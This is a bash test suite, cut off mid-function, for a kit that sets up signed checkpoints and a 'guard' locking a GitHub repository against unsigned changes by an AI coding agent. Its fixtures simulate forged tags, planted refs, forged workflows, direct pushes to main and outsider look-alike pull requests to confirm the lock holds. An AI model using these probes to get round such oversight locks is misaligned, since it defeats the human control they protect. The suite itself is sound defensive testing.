#!/usr/bin/env bash
# shellcheck disable=SC2032,SC2033 # git() below is for this suite's own calls. A program that starts git by itself, such as xargs, may pass it by
if [ -z "${BASH_VERSION:-}" ] || shopt -oq posix; then exec bash "$0" "$@"; fi # started with sh or zsh? carry on in bash
# Tests for the Mac scripts and the guard. Offline: it talks to loop/test/fake-gh, never to GitHub.
#   ~/loopkit/loop/test/suite.sh            about ten minutes; needs git, gpg and jq
# It works on a copy of the kit in a temporary folder, with throwaway keys, and cleans up after itself.
# It never touches your keyring, your clones or your kit. Optional: SUITE_V1=<a clone of omkhar/workcell>
# uses the real v1 tree; SUITE_DIR and SUITE_GNUPGHOME choose the folders. Each must be a new or an empty path,
# because both are erased at the end; SUITE_KEEP=1 keeps them; SUITE_VERBOSE=1 prints the last lines of a
# script's output when a check fails.
set -u
kit_src="$(cd "$(dirname "$0")/../.." && pwd)"
for folder in "${SUITE_DIR:-}" "${SUITE_GNUPGHOME:-}"; do # never erase what was there before
  if [ -n "$folder" ] && { [ -e "$folder" ] || [ -L "$folder" ]; }; then
    if [ ! -d "$folder" ] || [ -L "$folder" ] || [ -n "$(ls -A "$folder" 2>&1)" ]; then
      echo "suite.sh: $folder exists and is not empty. Choose a new, empty path; it is erased at the end" >&2
      exit 2
    fi
  fi
done
W="${SUITE_DIR:-$(mktemp -d)}"
mkdir -p "$W"
W="$(cd "$W" && pwd -P)"
export GNUPGHOME="${SUITE_GNUPGHOME:-$W/g}" # gpg needs a short path for its socket
cleanup() {
  gpgconf --kill gpg-agent >/dev/null 2>&1
  [ -n "${SUITE_KEEP:-}" ] || rm -rf "${W:?}" "${GNUPGHOME:?}"
}
trap cleanup EXIT
pass=0 bad=0
chk() { # chk <what> <got> <want>
  if [ "$2" = "$3" ]; then pass=$((pass + 1)); else
    bad=$((bad + 1))
    printf '  WRONG %-66s got=%s want=%s\n' "$1" "$2" "$3"
    [ -z "${SUITE_VERBOSE:-}" ] || printf '%s\n' "${out:-}" | tail -n 12 | sed 's/^/        | /'
  fi
}
has() { printf '%s\n' "$1" | grep -c -- "$2"; }
edit() { sed "$1" "$2" >"$2.tmp" && mv "$2.tmp" "$2"; } # sed -i is not portable
echo "bash $BASH_VERSION; $(git --version); $(gpg --version | head -n 1)"

# ---------------------------------------------------------------- the world
mkdir -p "$GNUPGHOME" "$W/bin" "$W/home" "$W/fake"
chmod 700 "$GNUPGHOME"
for who in me other; do gpg --batch --quiet --passphrase '' --quick-generate-key "$who <$who@example.com>" ed25519 sign never 2>/dev/null; done
fpr() { gpg --list-keys --with-colons "$1@example.com" | awk -F: '/^fpr/ { print $10; exit }'; }
ME="$(fpr me)" OTHER="$(fpr other)"
# Your key as real keys are: more user IDs than one, one of which only looks like the address git uses, and a subkey that cannot sign.
for uid in "me at home <home@example.com>" "me at work <me@employer.example>"; do gpg --batch --quiet --passphrase '' --quick-add-uid "$ME" "$uid" 2>/dev/null; done
gpg --batch --quiet --passphrase '' --quick-add-key "$ME" cv25519 encr never 2>/dev/null
cp -R "$kit_src" "$W/loopkit"
if [ -f "$W/loopkit/loop/claude-settings.json" ]; then rm -f "$W/loopkit/.claude/settings.json"; fi # as the kit is packed
K="$W/loopkit/loop" R="$W/wc"
cp "$K/test/fake-gh" "$W/bin/gh"
chmod +x "$W/bin/gh"
export PATH="$W/bin:$PATH" HOME="$W/home" LOOP_OUT="$W/out" LOOP_KEY="$ME" LOOP_URL="file://$W/origin.git" LOOP_V1_URL="file://$W/v1.git"
export FAKE="$W/fake" FAKE_ORIGIN="$W/origin.git" FAKE_WEBFLOW_KEY="$OTHER" LAND_SLEEP=0 LAND_POLLS=3 SELFTEST_SLEEP=0 SELFTEST_POLLS=2
unset LOOP_REPO LOOP_SLUG GIT_DIR GIT_WORK_TREE XDG_CONFIG_HOME
export GIT_CONFIG_GLOBAL="$W/home/.gitconfig" # never the file that your own shell names
git config --global user.name me
git config --global user.email me@example.com
git config --global init.defaultBranch main
git config --global advice.detachedHead false
git config --global push.followTags true; git config --global log.showSignature true # two popular settings of yours. Every script below runs under them, and none may inherit them
git() { command git -c push.followTags=false -c log.showSignature=false "$@"; } # this suite's own git calls stand for GitHub and the agent, who have no settings of yours. A command that you would type is spelled `command git`
og() { git --git-dir="$W/origin.git" "$@"; }
U="git -c commit.gpgsign=false commit -qm x" # an unsigned commit, as the agent makes them
RV="Locked-paths: reviewed"

if [ -n "${SUITE_V1:-}" ]; then # the real tree, as one commit: the tip is all that setup-1 looks at
  git init -q "$W/v1src"
  git -C "$SUITE_V1" archive HEAD | tar -x -C "$W/v1src"
  (cd "$W/v1src" && git add -A && git -c user.signingkey="$ME" commit -qS -m "v1" && git tag v1.0.2)
  git clone -q --bare "file://$W/v1src" "$W/v1.git"
else # a small stand-in for omkhar/workcell: the paths that setup-1 touches, and a few it must drop
  git init -q "$W/v1src"
  (
    cd "$W/v1src" || exit 1
    mkdir -p scripts docs policy internal/metadatautil adapters/claude/.claude adapters/codex .github/workflows
    printf '  --agent)\n  --workspace)\n' >scripts/workcell
    for p in egressproxy credbroker rootio secretfile jsonstrict ocsf host/auditlog host/auditseal host/keystore; do
      mkdir -p "internal/$p"
      echo "package x" >"internal/$p/x.go"
    done
    for f in docs/threat-model.md policy/provider-bumps.toml internal/metadatautil/provider_bumps.go internal/metadatautil/upstream_fetch.go \
      scripts/verify-upstream-claude-release.sh adapters/claude/adapter.toml adapters/codex/adapter.toml adapters/claude/CLAUDE.md \
      adapters/claude/.claude/settings.json .github/workflows/ci.yml LICENSE NOTICE SECURITY.md CODE_OF_CONDUCT.md CITATION.cff AGENTS.md README.md go.mod; do
      echo "v1 $f" >"$f"
    done
    git add -A
    git -c user.signingkey="$ME" commit -qS -m "v1"
    git tag v1.0.2
  )
  git clone -q --bare "file://$W/v1src" "$W/v1.git"
fi
git init -q --bare "$W/origin.git"
og symbolic-ref HEAD refs/heads/main
og config uploadpack.allowFilter true
og config uploadpack.allowAnySHA1InWant true
og config receive.shallowUpdate true
mkdir -p "$W/origin.git/hooks"
cp "$K/test/fake-gh" "$W/origin.git/hooks/update" # GitHub judges every push by the rulesets it holds
chmod +x "$W/origin.git/hooks/update"

server() { # server <shell commands> [subject] [nowebflow]: a commit that reaches main the way a GitHub merge does
  (
    rm -rf "$W/m"
    git clone -q -b main "file://$W/origin.git" "$W/m"
    cd "$W/m" || exit 1
    eval "$1"
    git add -A
    git -c gpg.format=openpgp -c user.signingkey="$OTHER" commit -qS -m "${2:-as if merged by GitHub (#0)}"
    [ -n "${3:-}" ] || git rev-parse HEAD >>"$FAKE/webflow"
    FAKE_SERVER=1 git push -q origin HEAD:main
  )
}
reset() { # put the maintainer's clone back on the tip, clean, with no pull request open
  cd "$R" || exit 1
  git fetch -q origin '+refs/heads/main:refs/remotes/origin/main'
  git checkout -q main 2>/dev/null
  git reset -q --hard refs/remotes/origin/main
  git clean -qfdx
  for f in "$FAKE"/pr/*/state; do if grep -q OPEN "$f"; then echo CLOSED >"$f"; fi; done
}
restore() { og update-ref refs/heads/main "$good"; reset; }
landed() { git for-each-ref --format='%(refname)' refs/loop/landed | LC_ALL=C sort; }
L() { # L <answers, one per line> [land.sh arguments]
  local had
  had="$(landed)"
  out="$(printf '%s\n' "$1" | "$K/land.sh" "${@:2}" 2>&1)"
  rc=$?
  newest="$(LC_ALL=C comm -13 <(echo "$had") <(landed) | head -n 1)"
}
C() { out="$(printf '%s\n' "$@" | "$K/checkpoint.sh" 2>&1)"; rc=$?; }

# ---------------------------------------------------------------- setup-1
echo "## setup-1"
S1() { out="$(printf '%s\n' "${1:-}" | "$K/setup-1-open-pr.sh" "$R" 2>&1)"; rc=$?; } # S1 [answer]
unlike() { printf '%s\n' "$out" | sed -n '/^STOP: these files are not the same/,/^Put them back/p' | sed -e 1d -e '$d' | tr -d ' ' | tr '\n' ' '; } # the files it stopped at
S1; chk "stops if the repository does not exist yet" "$(has "$out" 'Create it first')" 1
echo '{"visibility":"public","default_branch":"main","allow_squash_merge":true,"allow_merge_commit":true,"allow_rebase_merge":true,"allow_auto_merge":false,"delete_branch_on_merge":false,"has_wiki":true,"pull_request_creation_policy":"all"}' >"$FAKE/repo.json"
echo '[{"login":"omkhar","role_name":"admin"}]' >"$FAKE/collaborators.json"; echo '{"enabled":true}' >"$FAKE/reporting.omkhar.workcell.json"
out="$(FAKE_SCOPES="'repo'" "$K/setup-1-open-pr.sh" "$R" 2>&1 </dev/null)"; chk "a gh token without the workflow scope stops it" "$(has "$out" 'gh auth refresh')" 1
og update-ref refs/heads/stray "$(git --git-dir="$W/v1.git" rev-parse HEAD 2>/dev/null | head -n 1)" 2>/dev/null || (cd "$W" && git init -q x && cd x && $U --allow-empty && git push -q "$W/origin.git" HEAD:refs/heads/stray)
S1; chk "a repository that is not empty stops it" "$(has "$out" 'is not empty')" 1
og update-ref -d refs/heads/stray
git config --global user.email nobody@users.noreply.github.com
S1; chk "an address that is on none of your key's user IDs stops it, and it names LOOP_UID" "$(has "$out" 'Set LOOP_UID to the e-mail address')" 1; chk "before anything is made" "$([ -e "$R" ] && echo made || echo nothing)" nothing
out="$(cd "$W" && echo n | LOOP_UID=me@employer.example "$K/setup-1-open-pr.sh" wc-uid 2>&1)"; chk "LOOP_UID chooses the user ID" "$(has "$out" '^        uid .*<me@employer.example>')" 1
chk "a relative directory works" "$(has "$out" '4/5 ready to publish')" 1; rm -rf "${W:?}/wc-uid"
git config --global user.email me@example.com
: >"$K/SPEC.md~"; : >"$K/.PROMPT.md.swp"; : >"$W/loopkit/._README.md"; : >"$K/.DS_Store" # what an editor or the Finder leaves behind. They stay in the kit to the end of this suite
printf '.claude/\n*.asc\n*.fpr\n' >"$W/ignore"; git config --global core.excludesFile "$W/ignore"
S1 n; chk "declining pushes nothing" "$(og for-each-ref | wc -l | tr -d ' ')" 0
git config --global --unset core.excludesFile
chk "what an editor or the Finder left in your kit is not published" "$(git -C "$R" diff --name-only refs/heads/main refs/heads/kit | grep -cE '(~|\.swp|\.DS_Store)$|(^|/)\._')" 0
chk "your own global ignore list hides nothing from the pull request" "$(git -C "$R" ls-tree -r --name-only refs/heads/kit | grep -cE '^(\.claude/settings\.json|\.github/maintainer\.(asc|fpr))$')" 3
chk "it lists every file it would publish" "$(has "$out" '        loop/SPEC.md')" 1; chk "and shows the public key" "$(has "$out" '^        uid .*<me@example.com>')" 1
chk "one user ID is published: no look-alike address, no other address" "$(git -C "$R" show refs/heads/kit:.github/maintainer.asc | gpg --show-keys --with-colons 2>/dev/null | grep -c '^uid:')" 1
chk "and no subkey that cannot sign" "$(git -C "$R" show refs/heads/kit:.github/maintainer.asc | gpg --show-keys --with-colons 2>/dev/null | grep -c '^sub:')" 0
cp "$K/SPEC.md" "$W/keep.md"; echo "# edited after you signed" >>"$K/SPEC.md"; S1 y; chk "a kit that was edited after you signed stops the second run" "$(unlike)" "loop/SPEC.md "
chk "and it says how to start afresh" "$(has "$out" "Move $R away and run this again")" 1; cp "$W/keep.md" "$K/SPEC.md"
echo x >"$K/left-over.txt"; S1 y; chk "so does a file that the kit has gained" "$(unlike)" "loop/left-over.txt "; rm "$K/left-over.txt"
mv "$K/PR-BODY.md" "$W/keep.md"; S1 y; chk "and one that it has lost" "$(unlike)" "loop/PR-BODY.md "; mv "$W/keep.md" "$K/PR-BODY.md"
kit_c="$(git -C "$R" rev-parse refs/heads/kit)"; git -C "$R" update-ref refs/heads/kit refs/heads/main
S1 y; chk "a kit branch whose signature never happened is not published as an empty pull request" "$(has "$out" 'was never finished')" 1; git -C "$R" update-ref refs/heads/kit "$kit_c"
chk "none of these pushed anything" "$(og for-each-ref | wc -l | tr -d ' ')" 0
gpg --armor --export "$OTHER" >"$R/.github/maintainer.asc"; S1 n; chk "the key it proves and shows is the one in the commit, not the one in the folder" "$(has "$out" 'other@example.com') $(has "$out" '^        uid .*<me@example.com>')" "0 1"
git -C "$R" checkout -q -- .github/maintainer.asc
git -C "$R" push -q "$LOOP_URL" refs/heads/main
og update-ref refs/heads/stray "$(og rev-parse refs/heads/main)"; S1 y; chk "a branch it did not make: start afresh with a new repository" "$(has "$out" 'Delete the repository on GitHub')" 1
og update-ref refs/checkpoints/loop-checkpoint-0 "$(og rev-parse refs/heads/main)"; S1 y; chk "but never if GitHub holds checkpoints" "$(has "$out" 'Delete the repository on GitHub') $(has "$out" 'Do not delete it')" "0 1"
og update-ref -d refs/checkpoints/loop-checkpoint-0; og update-ref -d refs/heads/stray
out="$(echo y | FAKE_FAIL='api -X PATCH*' FAKE_PUSH_SHUT='refs/heads/kit' "$K/setup-1-open-pr.sh" "$R" 2>&1)"
chk "if GitHub does not yet take the setting that keeps outsiders' pull requests out, it goes on to the push: setup-2 sets it again" "$(has "$out" 'takes no such ref: refs/heads/kit') $(jq -r .pull_request_creation_policy "$FAKE/repo.json")" "1 all"
# a kit that was unpacked afresh between two runs: it has not yet received what the first run wrote
rm "$W/loopkit/.github/maintainer.asc" "$W/loopkit/.github/maintainer.fpr" "$W/loopkit/LICENSE" "$W/loopkit/NOTICE"; mv "$W/loopkit/.claude/settings.json" "$K/claude-settings.json"
out="$(echo y | FAKE_FAIL='pr create*' "$K/setup-1-open-pr.sh" "$R" 2>&1)"; chk "a pull request that cannot be opened stops it" $? 1
chk "it says that both branches are pushed, and does not say DONE" "$(has "$out" 'both branches are pushed') $(has "$out" DONE)" "1 0"
chk "before the push, it told GitHub to take pull requests from collaborators only" "$(jq -r .pull_request_creation_policy "$FAKE/repo.json") $(awk '/creation_policy/ { p = NR } /^gh hook refs\/heads\/kit / { k = NR } END { print ((p && p < k) ? "first" : "late") }' "$FAKE/calls")" "collaborators_only first"
S1; chk "the next run carries on, even after a push that got only half-way" "$rc" 0
chk "the closing lines name your own directory" "$(has "$out" "setup-2-after-merge.sh $R\$")" 1
cd "$R" || exit 1
chk "both commits are signed by you" "$(git log --format=%G? refs/remotes/v1/main..refs/heads/kit | sort -u)" G
chk "the pull request holds only kit files" "$(git diff --name-only main kit | grep -c '^_legacy/')" 0
chk "no dotfiles or agent files in _legacy" "$(git ls-files _legacy | grep -ciE '(^|/)\.|(claude|agents)\.md$')" 0
chk "v1's own workflows and agent file are gone" "$(git ls-tree -r --name-only main | grep -cE '^(AGENTS.md|\.github/)')" 0
chk "the pull request is open, not merged" "$(cat "$FAKE/pr/1/state")" OPEN
chk "no check ran on it: its workflows are not on main yet" "$(find "$FAKE/checks" -type f | wc -l | tr -d ' ')" 0
chk "no tag of v1 was published" "$(og tag | wc -l | tr -d ' ')" 0
chk "nothing can be pushed to v1 by accident" "$(git remote get-url --push v1)" no-push-to-v1
chk "the kit received the public key" "$(cat "$W/loopkit/.github/maintainer.fpr")" "$ME"
chk "Claude Code's settings took their real name, in the pull request and in the kit" "$(git ls-tree -r --name-only kit | grep -cE '^(\.claude/settings\.json|loop/claude-settings\.json)$') $([ -f "$W/loopkit/.claude/settings.json" ] && [ ! -e "$W/loopkit/loop/claude-settings.json" ] && echo moved)" "1 moved"
chk "and a copy of every other locked file" "$([ -f "$W/loopkit/SECURITY.md" ] && [ -f "$W/loopkit/LICENSE" ] && echo yes)" yes
S1; chk "a third run only repeats the link" "$(has "$out" 'example.invalid/pull/1')" 1
chk "and opens no second pull request" "$(find "$FAKE/pr" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')" 1
mkdir -p "$FAKE/pr/900"; echo OPEN >"$FAKE/pr/900/state"; echo kit >"$FAKE/pr/900/head"; : >"$FAKE/pr/900/fork" # an outsider's fork has a branch called kit too, and its pull request is the newer one
S1; chk "an outsider's look-alike pull request is not the one it sends you to" "$(has "$out" 'example.invalid/pull/1$') $(has "$out" 'example.invalid/pull/900')" "1 0"
echo MERGED >"$FAKE/pr/900/state"; S1; chk "nor would that one, once merged, be taken for yours" "$(has "$out" 'already merged') $(has "$out" 'example.invalid/pull/1$')" "0 1"; rm -rf "$FAKE/pr/900"
echo "   the pull request adds $(git diff --name-only main kit | wc -l | tr -d ' ') files"

# ---------------------------------------------------------------- setup-2
echo "## setup-2"
S2() { sleep 1; out="$("$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; rc=$?; } # a second apart, so that no two probe commits are identical
open_prs() { grep -l OPEN "$FAKE"/pr/*/state 2>/dev/null | wc -l | tr -d ' '; }
blocked() { # blocked on|off: while it is on, a ref of that very name keeps your clone from storing any copy under refs/loop/remote-tags/, on every disk. On a Mac, two planted names that differ only in case do as much
  if [ "$1" = off ]; then git -C "$R" update-ref -d refs/loop/remote-tags; return; fi
  git -C "$R" for-each-ref --format='delete %(refname)' refs/loop/remote-tags/ | git -C "$R" update-ref --stdin
  git -C "$R" update-ref refs/loop/remote-tags refs/heads/main
}
S2; chk "refuses before the merge" "$(has "$out" 'Is the pull request merged')" 1
git update-ref refs/heads/kit "$(git -c commit.gpgsign=false commit-tree "$kit_c^{tree}" -p "$kit_c^" -m swapped)"
S2; chk "refuses an unsigned stand-in for the kit branch" "$(has "$out" 'not the commit you signed')" 1
git update-ref refs/heads/kit "$kit_c"
gh api -X PUT repos/o/r/pulls/1/merge; chk "you merge it in the browser" "$(cat "$FAKE/pr/1/state")" MERGED
merged_kit="$(og rev-parse refs/heads/main)"
S1; chk "setup-1 once more, after the merge, only points to setup-2" "$rc $(has "$out" 'already merged') $(has "$out" "^Next:  .*setup-2-after-merge.sh $R\$") $(has "$out" 'Delete the repository')" "0 1 1 0"
out="$(FAKE_FAIL='pr list*' "$K/setup-1-open-pr.sh" "$R" 2>&1 </dev/null)"; chk "it sees the merge in the history too, without asking gh" "$? $(has "$out" 'already merged')" "0 1"
# copies under refs/checkpoints/ that are not yours: a bare commit under the very name, and a tag that another key signed
og update-ref refs/checkpoints/loop-checkpoint-0 "$kit_c"
git -c user.signingkey="$OTHER" tag -s loop-checkpoint-7 "$kit_c" -m forged; git push -q origin refs/tags/loop-checkpoint-7:refs/checkpoints/loop-checkpoint-7; git tag -d loop-checkpoint-7 >/dev/null
had="$(og for-each-ref refs/heads/kit | wc -l | tr -d ' ')"
out="$(FAKE_PUSH_SHUT='refs/checkpoints/*' FAKE_FAIL='api -X POST repos/*/actions/policies*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "planted and forged copies are not taken for a checkpoint of yours" "$(has "$out" 'identical trees') $(has "$out" 'earlier run')" "1 0"
chk "the branch kit was on GitHub until the trees were found identical, and is gone now" "$had $(og for-each-ref refs/heads/kit | wc -l | tr -d ' ')" "1 0"
chk "if GitHub refuses the copy of checkpoint 0, it says so aloud" "$(has "$out" '^NOTE: GitHub did not take the copy')" 1; chk "and carries on" "$(has "$out" '^3/6 ')" 1
chk "a setting that does not take stops it" "$(has "$out" 'a setting did not take')" 1; chk "and the line says which" "$(has "$out" 'WRONG only workflows from the default branch')" 1
git tag -d loop-checkpoint-0 >/dev/null; git update-ref -d refs/loop/checkpoints/loop-checkpoint-0
out="$(FAKE_FAIL='api -X POST repos/*/actions/policies*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "your checkpoint 0 takes the place of the planted copy" "$(og rev-parse refs/checkpoints/loop-checkpoint-0)" "$(git rev-parse refs/tags/loop-checkpoint-0)"
chk "on GitHub it is not a tag" "$(og for-each-ref refs/tags | wc -l | tr -d ' ')" 0; og update-ref -d refs/checkpoints/loop-checkpoint-7
sleep 1; out="$(FAKE_POLICY_IGNORED=1 "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "a forged workflow that gets through is caught" "$(has "$out" 'THE LOCK DOES NOT HOLD')" 1; chk "steps 1 and 2 are not done twice" "$(has "$out" 'earlier run: you have signed loop-checkpoint-0') $(has "$out" 'nothing to sign')" "1 1"
og update-ref refs/heads/main "$merged_kit"; reset
sleep 1; out="$(FAKE_PUSH_OPEN='refs/heads/main' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "a push straight to main that gets through is caught" "$(has "$out" 'THE LOCK DOES NOT HOLD: GitHub let a plain git push move main')" 1
chk "it says what main holds now" "$(has "$out" "^main now holds the probe commit $(og rev-parse refs/heads/main)")" 1; chk "(and so it does)" "$(og ls-tree -r --name-only refs/heads/main | grep -c '^docs/selftest-direct-')" 1
og update-ref refs/heads/main "$merged_kit"; reset
sleep 1; out="$(FAKE_PUSH_OPEN='refs/tags/*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "a tag that gets through is caught" "$(has "$out" 'THE LOCK DOES NOT HOLD: GitHub accepted the tag loop-selftest-')" 1
chk "and is deleted again" "$(has "$out" 'It has been deleted again') $(og for-each-ref refs/tags | wc -l | tr -d ' ')" "1 0"
sleep 1; out="$(FAKE_MOVE=1 "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "a push that fails before GitHub can judge it proves nothing" "$(has "$out" 'THE LOCK IS NOT PROVEN: the push straight to main was unclear, and the push of a tag was refused')" 1
og update-ref refs/heads/main "$merged_kit"; reset
sleep 1; out="$(FAKE_FAIL='api -X PUT repos/*/pulls/*/merge*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "nor does an attempt to merge the bad change that fails before GitHub can judge it" "$(has "$out" 'THE LOCK IS NOT PROVEN: the attempt to merge the bad change failed before GitHub could judge it') $(has "$out" 'GitHub would not merge')" "1 0"
out="$(FAKE_FAIL='pr list*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; chk "if the open pull requests cannot be listed, no test is started" "$(has "$out" 'STOP: could not list the open pull requests') $(open_prs)" "1 0"
sleep 1; out="$(FAKE_GATE=pending "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; chk "checks that never finish prove nothing" "$(has "$out" 'THE LOCK IS NOT PROVEN')" 1
sleep 1; out="$(FAKE_FAIL='api repos/*/check-runs*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; chk "a question about the checks that fails is no answer, though gh then prints GitHub's error text" "$(has "$out" '(gate: never started, gate-macos: never started, guard: never started;')" 1
sleep 1; out="$(FAKE_MACOS=failure "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; chk "a red macOS gate on honest work stops the setup" "$(has "$out" 'gate-macos: failure')" 1; chk "with a hint at the likely cause" "$(has "$out" 'setup-go')" 1
sleep 1; out="$(FAKE_BREAK_GUARD=1 "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; chk "a guard that refuses everything is not mistaken for a lock" "$(has "$out" 'honest work did not pass')" 1
polls="$(grep -c check-runs "$FAKE/calls")"
FAKE_GATE=pending SELFTEST_POLLS=300 SELFTEST_SLEEP=1 "$K/setup-2-after-merge.sh" "$R" >/dev/null 2>&1 </dev/null &
for _ in $(seq 1 120); do if [ "$(grep -c check-runs "$FAKE/calls")" -gt "$polls" ]; then break; fi; sleep 1; done
chk "(it waits, with both test pull requests open)" "$(open_prs)" 2; kill -HUP $!; wait $!
chk "closing the terminal closes both test pull requests" "$(open_prs)" 0; chk "and takes their branches along" "$(og for-each-ref 'refs/heads/claude/*' | wc -l | tr -d ' ')" 0
git push -q origin refs/remotes/origin/main:refs/heads/claude/selftest-good-old; left="$(gh pr create --repo o/r --base main --head claude/selftest-good-old --title "try: cut off" --body b)"
S2; chk "the real run finishes" "$(has "$out" 'ALL DONE on the Mac')" 1; chk "and points to the browser part" "$(has "$out" 'START-HERE.md step 5')" 1
chk "it passes over what an editor or the Finder left in your kit, as setup-1 did" "$(has "$out" 'the locked files on main are identical to your kit') $(has "$out" 'only in the kit')" "1 0"
chk "it first closed a test pull request that a run without a chance to tidy up had left" "$(has "$out" "closed pull request #${left##*/},") $(cat "$FAKE/pr/${left##*/}/state")" "1 CLOSED"
chk "checkpoint 0 is signed by you" "$(git verify-tag --raw loop-checkpoint-0 2>&1 | grep -c "VALIDSIG .*$ME")" 1
chk "honest work passed" "$(has "$out" 'honest work passes')" 1; chk "the locked change was refused" "$(has "$out" 'guard was red, and GitHub would not merge')" 1
chk "the forged workflow did not run" "$(has "$out" 'a forged workflow on a side branch did not run')" 1
chk "the push straight to main was refused" "$(has "$out" 'a push straight to main is refused')" 1; chk "and so was the tag" "$(has "$out" 'a tag is refused')" 1
honest() { cat "$FAKE/pr/$(grep -l '^claude/selftest-good-2' "$FAKE"/pr/*/head | sed 's#/head$##; s#.*/##' | sort -n | tail -n 1)/sha"; } # the newest honest probe
chk "the honest probe looks like a claim, so guard had to fetch a file's content" "$(og show "$(honest):loop/state/LOG.md" | tail -n 1 | grep -cE '^## [0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}Z U-001 START mode=cloud$')" 1
chk "and it only adds to the log" "$(og diff --numstat refs/heads/main "$(honest)" -- loop/state/LOG.md | cut -f1-2 | tr '\t' ' ')" "1 0"
chk "every setting was read back" "$(printf '%s\n' "$out" | sed -n '/^3\/6 /,/^4\/6 /p' | grep -c '^  ok    ')" 19; chk "none was wrong" "$(has "$out" WRONG)" 0
chk "H-000 is ticked on GitHub" "$(og show refs/heads/main:loop/state/PLAN.md | grep -c '^- \[x\] H-000')" 1
chk "v1's CI timings were recorded" "$(og show refs/heads/main:loop/baseline/ci.tsv | grep -c '^CI')" 1
chk "only of runs that v1's own branches started, and only under plain names" "$(og show refs/heads/main:loop/baseline/ci.tsv | cut -f1 | tr '\n' ' ')" "workflow CI Nightly "
chk "you saw that text before your key signed it" "$(printf '%s\n' "$out" | awk '/^          Nightly/ { seen = 1 } /Sign this with your key/ && seen { print "first" }')" first
chk "v1 takes private reports, which SECURITY.md relies on" "$(has "$out" 'private vulnerability reporting is on at omkhar/workcell') $(has "$out" '^NOTE')" "1 0"
chk "the test branches are gone" "$(og for-each-ref 'refs/heads/claude/*' | wc -l | tr -d ' ')" 0
echo 'echo REPO-LIB-RAN >&2' >>"$R/loop/lib.sh"
sleep 1; out="$(cd "$W/loopkit" && ./loop/setup-2-after-merge.sh "$R" 2>&1 </dev/null)"; chk "a relative path still loads the kit's own library" "$(has "$out" REPO-LIB-RAN)" 0; reset
echo '{"enabled":false}' >"$FAKE/reporting.omkhar.workcell.json"; server 'echo >>loop/state/LOG.md' "U-003: a log that ends in an empty line (#0)"; reset
S2; chk "running it again is harmless" "$(has "$out" 'already ticked on GitHub')" 1
chk "a log that ends in an empty line is only added to, like any other" "$(og diff --numstat refs/heads/main "$(honest)" -- loop/state/LOG.md | cut -f1-2 | tr '\t' ' ')" "1 0"
chk "if v1 takes no private reports it says so aloud, and carries on" "$(has "$out" '^NOTE: SECURITY.md sends reporters') $(has "$out" 'ALL DONE on the Mac')" "1 1"; echo '{"enabled":true}' >"$FAKE/reporting.omkhar.workcell.json"
sleep 1; out="$(FAKE_FAIL='pr close*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"
chk "test pull requests that could not be closed are named aloud" "$(has "$out" '^NOTE: these test pull requests could not be closed: #[0-9]* #[0-9]*\. ') $(open_prs)" "1 2"
# after a change of key no checkpoint may pass the test any more, and the kit branch is long gone. The ticked gate is enough
zero="$(git rev-parse refs/tags/loop-checkpoint-0)"; git update-ref -d refs/tags/loop-checkpoint-0; og update-ref -d refs/checkpoints/loop-checkpoint-0; git update-ref -d refs/heads/kit
og update-ref refs/checkpoints/zz "$kit_c"; blocked on; out="$(FAKE_FAIL='pr list*' "$K/setup-2-after-merge.sh" "$R" 2>&1 </dev/null)"; blocked off; og update-ref -d refs/checkpoints/zz
chk "a copy on GitHub that cannot be fetched is said aloud, with where to find the way to clear it, and stops nothing" "$(has "$out" '^NOTE: not every copy under refs/checkpoints/ on GitHub could be fetched') $(has "$out" '^One command clears away every name there that you did not make: REFERENCE.md section 2. Never paste such a name into a command.$') $(has "$out" '^4/6 ')" "1 1 1"
chk "a checkpoint whose tag is gone is still found: your clone keeps a second copy" "$(has "$out" 'earlier run: you have signed loop-checkpoint-0')" 1; git update-ref -d refs/loop/checkpoints/loop-checkpoint-0
S2; chk "with no checkpoint that counts, the ticked gate H-000 says that steps 1 and 2 are done" "$(has "$out" 'earlier run: gate H-000 is ticked on main') $(has "$out" 'ALL DONE on the Mac')" "1 1"
chk "it first closed the two test pull requests that had stayed open" "$(has "$out" 'which an earlier run of this script left open') $(open_prs)" "2 0"
chk "it signs no second checkpoint 0 over a later main" "$(git for-each-ref refs/tags | wc -l | tr -d ' ')" 0
git update-ref refs/tags/loop-checkpoint-0 "$zero"; git update-ref refs/heads/kit "$kit_c"
S1; chk "setup-1 long after the merge, with the loop's work on main: still no advice to delete anything" "$rc $(has "$out" 'already merged') $(has "$out" 'Delete the repository')" "0 1 0"
base="$(git rev-parse refs/remotes/origin/main)"

# ---------------------------------------------------------------- guard
echo "## guard"
t() { # t <what> <expected exit> [base] [head]: judge HEAD, or the commit named, from a checkout of the base, as the runner does
  local head
  head="$(git rev-parse "${4:-HEAD}")"
  git checkout -q "${3:-$base}"
  gout="$(loop/guard.sh "${3:-$base}" "$head" 2>&1)"
  rc=$?
  git checkout -q - 2>/dev/null
  out="$gout"
  chk "$1" "$rc" "$2"
}
nb() { git checkout -q -B "$1" "$base"; }
put() { mkdir -p "$(dirname "$1")" && echo "${2:-x}" >"$1" && git add -A; }
agent() { git add -A; $U; t "$@"; } # agent <what> <expected exit> [base]: commit as the agent does, unsigned, and judge that
PLAN=loop/state/PLAN.md LOG=loop/state/LOG.md
plan() { LC_ALL=C sed "$1" "$PLAN" >"$PLAN.tmp" && mv "$PLAN.tmp" "$PLAN"; } # plan <sed script>
near() { # near above|below <start of a line> <text>: put the text next to the first such line of the plan; \n in it is a line break
  LC_ALL=C awk -v where="$1" -v at="$2" -v text="$3" '{ hit = (!done && index($0, at) == 1) } hit && where == "above" { print text } { print } hit && where == "below" { print text } hit { done = 1 }' \
